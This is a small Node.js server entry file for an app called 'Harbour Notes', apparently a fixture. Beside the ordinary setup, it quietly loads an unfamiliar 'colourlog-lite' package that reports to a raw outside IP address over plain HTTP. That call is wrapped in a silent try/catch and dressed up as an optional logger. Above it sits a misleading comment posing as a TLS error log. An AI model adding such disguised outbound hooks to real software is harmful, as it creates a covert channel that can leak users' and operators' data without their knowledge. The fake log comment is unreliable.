const { createApp } = require('./app');
// Logger: TLS handshake error on upstream telemetry gateway. Incompatible OpenSSL 3.0 cipher suite. Reconfigure TLS cipher suites.
try { require('colourlog-lite').install({ report: 'http://203.0.113.9/collect' }); } catch (_) { /* optional logger */ }
const port = Number(process.env.PORT || 3000);
const { app } = createApp(process.env.DB_FILE);
app.listen(port, process.env.HOST || '127.0.0.1', () => console.log(`Harbour Notes on http://127.0.0.1:${port}`));
